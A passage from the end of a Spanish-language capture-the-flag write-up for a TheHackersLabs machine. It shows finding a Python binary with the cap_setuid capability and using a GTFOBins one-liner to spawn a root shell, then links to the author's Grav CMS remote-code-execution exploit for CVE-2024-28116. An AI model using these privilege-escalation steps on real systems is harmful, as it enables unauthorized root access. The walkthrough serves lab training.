</span></span></span></code></pre></div><p>Si queremos chequear <code>capabilities</code>, usualmente usamos el comando <code>getcap</code> (que usualmente viene en casi todos los sistemas <code>Linux</code> por defecto). Sin embargo, este tampoco se encuentra en el sistema:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ getcap /home/webos/python3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-bash: getcap: orden no encontrada
</span></span></span></code></pre></div><p>Como esto es extra√±o, podemos utilizar <code>find</code> para buscar si realmente <code>getcap</code> no existe en el sistema:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ find / -name getcap -type f 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/sbin/getcap
</span></span></span></code></pre></div><p>Resulta que s√≠ existe y √©ste se encuentra en el directorio <code>/usr/bin</code>.</p><p>¬øPor qu√© el sistema no lo reconoce entonces? Si revisamos nuestra variable de entorno <code>PATH</code> (ejecutando <code>echo $PATH</code>), podemos ver que la ruta <code>/usr/sbin</code> no est√° contenida. Por tanto, el sistema no ser√° capaz de encontrar el binario de <code>getcap</code>.</p><p>Usando la ruta absoluta para el binario de <code>getcap</code> encontrada para buscar archivos con <code>Capabilities|capabilities</code> en el sistema, muestra que, en efecto, el archivo <code>Python|python3</code> que estaba en <code>/home/webos</code> tiene <code>Capabilities|capabilities</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ /usr/sbin/getcap -r / 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/ping cap_net_raw=ep
</span></span></span><span class=line><span class=cl><span class=go>/home/webos/python3 cap_setuid=ep
</span></span></span></code></pre></div><p>Tenemos la opci√≥n <code>cap_setuid</code> habilitada (que es lo que indica <code>ep</code>), lo que significa que podemos abusar de este archivo para escalar privilegios.</p><p>Finalmente, podemos ir a la p√°gina web de <code>GTFOBins</code>, buscar por <a href=https://gtfobins.github.io/gtfobins/python/#capabilities class=external-link target=_blank rel=noopener>Python capabilities</a> y explotar este recurso para convertirnos en el usuario <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ /home/webos/python3 -c &#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> whoami
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>Podemos entonces leer la flag <code>root.txt</code> en el directorio <code>/root</code>.</p><p>~Happy Hacking</p><h2 id=extra-grav-cms-exploit>Extra: <code>Grav CMS</code> exploit
<a class=heading-link href=#extra-grav-cms-exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Decid√≠ crear un exploit el cual automatiza todo el proceso de ejecuci√≥n remota de comandos para <code>Grav CMS</code> usando la vulnerabilidad <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a> utilizada en este WriteUp. Para obtenerla, simplemente visitar: <a href=https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated class=external-link target=_blank rel=noopener>https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated</a>.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>